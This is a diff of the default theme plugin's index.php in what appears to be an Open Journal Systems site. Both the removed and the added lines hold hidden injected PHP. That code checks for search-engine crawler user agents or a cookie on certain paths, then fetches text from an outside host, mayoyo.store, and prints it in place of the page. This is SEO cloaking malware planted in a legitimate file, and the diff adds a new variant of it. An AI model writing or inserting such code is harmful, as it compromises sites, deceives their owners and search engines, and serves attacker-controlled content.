@@ -1,10 +1,9 @@
 <?php
-function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://mayoyo.store/revistas.utm.edu.ec/index.txt');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
+if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/index.php/jurnalbinaedukasi' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/index.php/jurnalbinaedukasi' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/index.php/jurnalbinaedukasi' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
+    echo implode('', file('https://mayoyo.store/journal.binadarma.ac.id/jurnalbinaedukasi.txt'));
+    exit;
+}
 
-/**
- * @defgroup plugins_themes_default Default theme plugin
- */
- 
 /**
  * @file plugins/themes/default/index.php
  *
@@ -13,10 +12,9 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup plugins_themes_default
+ *
  * @brief Wrapper for default theme plugin.
  *
  */
 
-require_once('DefaultThemePlugin.inc.php');
-
-return new DefaultThemePlugin();
+return new \APP\plugins\themes\default\DefaultThemePlugin();
